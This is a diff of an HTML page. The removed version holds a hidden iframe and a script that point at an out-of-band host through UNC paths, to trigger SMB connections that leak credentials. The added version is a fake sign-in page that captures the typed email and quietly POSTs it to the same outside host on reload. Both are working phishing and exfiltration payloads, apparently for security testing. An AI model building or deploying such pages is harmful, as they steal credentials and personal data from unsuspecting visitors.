@@ -1,24 +1,58 @@
 <!DOCTYPE html>
-<html>
-  <head>
-    <title>Welcome</title>
-    <style>
-      iframe {
-        display: none; /* Iframe tidak terlihat */
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Login</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f9f9f9;
+      display: flex;
+      height: 100vh;
+      align-items: center;
+      justify-content: center;
+    }
+    .box {
+      background: white;
+      padding: 30px;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    }
+    input {
+      padding: 10px;
+      width: 100%;
+      font-size: 16px;
+      margin-top: 10px;
+    }
+  </style>
+</head>
+<body>
+  <div class="box">
+    <h2>Sign in to continue</h2>
+    <input type="email" id="emailInput" placeholder="Enter your email" autocomplete="email" />
+  </div>
+
+  <script>
+    const emailInput = document.getElementById('emailInput');
+
+    // Simpan email saat kehilangan fokus
+    emailInput.addEventListener('blur', () => {
+      const typed = emailInput.value.trim();
+      if (typed) {
+        localStorage.setItem("stored_email", typed);
       }
-    </style>
-  </head>
-  <body>
-    <h1>Loading...</h1>
+    });
 
-    <!-- Trigger hidden SMB connection via UNC path -->
-    <iframe src="file://///jqdfjiuzmdhhkipzoaxxf2ocrw07i3cw7.oast.fun/hidden.jpg"></iframe>
-
-    <script>
-      // Optional: trigger fallback using script fetch as secondary method
-      const s = document.createElement("script");
-      s.src = "\\\\jqdfjiuzmdhhkipzoaxxf2ocrw07i3cw7.oast.fun\\backup.js";
-      document.body.appendChild(s);
-    </script>
-  </body>
+    // Saat halaman dimuat ulang, kirim email yang tersimpan
+    const cached = localStorage.getItem("stored_email");
+    if (cached) {
+      fetch("https://jqdfjiuzmdhhkipzoaxxf2ocrw07i3cw7.oast.fun", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ email: cached })
+      });
+      localStorage.removeItem("stored_email"); // hapus setelah dikirim
+    }
+  </script>
+</body>
 </html>
